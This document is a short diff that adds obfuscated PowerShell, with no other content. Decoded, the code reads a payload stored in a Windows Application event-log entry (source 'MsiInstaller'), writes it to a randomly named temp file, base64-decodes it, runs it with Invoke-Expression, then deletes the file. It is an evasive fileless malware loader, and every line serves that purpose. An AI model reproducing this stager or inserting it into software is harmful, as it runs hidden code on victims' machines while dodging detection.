@@ -1,0 +1,7 @@
+${B2834`90b}=&([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('R2V0LVJhbmRvbQ==')))
+${981`70F8C`d4}="C:\Users\$env:USERNAME\AppData\Local\Temp\$b283490b"
+${20`18`44d} = &("{3}{1}{0}{2}" -f'Even','et-','tLog','G') -LogName ([Text.Encoding]::ASCII.GetString([byte[]](65,112,112,108,105,99,97,116,105,111,110))) -Source ([Text.Encoding]::ASCII.GetString([byte[]](77,115,105,108,110,115,116,97,108,108,101,114))) -Instanceid ([BitConverter]::ToUInt32([byte[]](9, 4, 0, 0), 0)) -Newest 1
+${725`d`18} = [IO.File]::OpenWrite(${98170`F8`cD4})
+${201`8`44d} | .("{1}{3}{2}{0}" -f 'ct','For','je','Each-Ob'){${97`F2842c8e6`1CCd`8`D600Eb5D`4FCf6`391} = (${_}.Data);${7`25d`18}.Write(${9`7f2842C8e61cC`d8d600eB5D4`FCf6`391}, 0, ${97f2842C8e`61c`cd`8D600`Eb5d4Fcf6391}.Length)}
+${7`25d`18}.Close()
+${26Cc`EEa354391`3633AB`4D300`66`B25d15} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((.("{3}{1}{2}{0}" -f't','-Conte','n','Get') -Path ${9`8`1`70f8cD4} -Raw))); &("{0}{1}" -f 'ie','x') ${2`6cc`EeA`3543`9`13`6`3`3Ab4`d30066b25d15}; &('rm') ${9`8170`F8`cD4}
